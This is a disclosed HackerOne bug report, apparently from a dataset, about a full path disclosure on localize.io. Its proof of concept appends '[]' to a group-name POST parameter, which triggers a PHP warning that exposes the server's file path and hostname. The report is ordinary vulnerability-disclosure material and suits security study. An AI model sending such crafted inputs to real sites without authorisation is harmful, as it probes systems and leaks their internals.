---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '8090'
original_report_id: '8090'
title: Full Path Disclosure / Info Disclosure in Creating New Group
weakness: Information Disclosure
team_handle: localize
created_at: '2014-04-19T01:50:47.683Z'
disclosed_at: '2014-04-19T02:26:24.378Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 10
tags:
- hackerone
- information-disclosure
---

# Full Path Disclosure / Info Disclosure in Creating New Group

## Metadata

- HackerOne Report ID: 8090
- Weakness: Information Disclosure
- Program: localize
- Disclosed At: 2014-04-19T02:26:24.378Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,
I found another information disclosure vulnerability/Full Path Disclosure on your application.
this time its on Creating New Group Section.

Proof of Concept
-------------------------

GET  : http://www.localize.io/pages/create_project/ [project ID]
POST CONTENT: CSRFToken=TOKEN VALUE&addGroup[name][]=new+group

I just Added "[]" after *addGroup[name]* and Replied.

### The information from page:
> Warning: trim() expects parameter 1 to be string, array given in /var/www/vhosts/lvps178-77-99-228.dedicated.hosteurope.de/httpdocs_localize/classes/Phrase.php on line 213

I Also Added a Screenshot of that FPD as attachment..
Hope You'll fix this one also..
Thanks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
